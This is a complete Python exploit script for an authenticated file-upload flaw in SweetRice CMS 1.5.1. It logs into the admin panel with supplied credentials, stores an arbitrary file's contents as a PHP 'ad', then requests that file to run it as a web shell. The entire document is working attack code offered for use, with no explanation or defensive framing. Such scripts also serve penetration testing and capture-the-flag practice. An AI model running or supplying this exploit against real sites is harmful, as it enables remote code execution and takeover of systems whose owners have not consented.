#!/usr/bin/env python
"""
author: austin404
written for sweetrice version 1.5.1 file upload exploit
Note: Authentication required
"""
import requests
import sys
import os

if len(sys.argv) != 5:
    print(f"[-] usage {sys.argv[0]} host username password filename")
    exit(1)

host = sys.argv[1].rstrip('/')
username = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]

basename = os.path.basename(filename).split('.')[0]

login_url = f"{host}/as/?type=signin"
upload_url = f"{host}/as/?type=ad&mode=save"
file_url = f"{host}/inc/ads/{basename}.php"

s = requests.session()

login_data = {
    "user":username,
    "passwd":password,
    "rememberMe":""
}

r = s.post(login_url, data=login_data)

if r.json().get("status") == 0:
    print("[-] Login failed incorrect credentials")
    r.close()
    s.close()
    exit(1)

upload_text = ""

with open(filename) as f:
    upload_text = f.read()

data = {
    "adk": basename,
    "adv": upload_text
}

r = s.post(upload_url, data=data)

if r.status_code == 200:
    print("Spawnning baby shell uwu!")
    r = s.get(file_url)
    if r.status_code == 200:
        print("Baby shell spawned uwu!")
    else:
        print(f"Went wrong with status code {r.status_code}")
r.close()
s.close()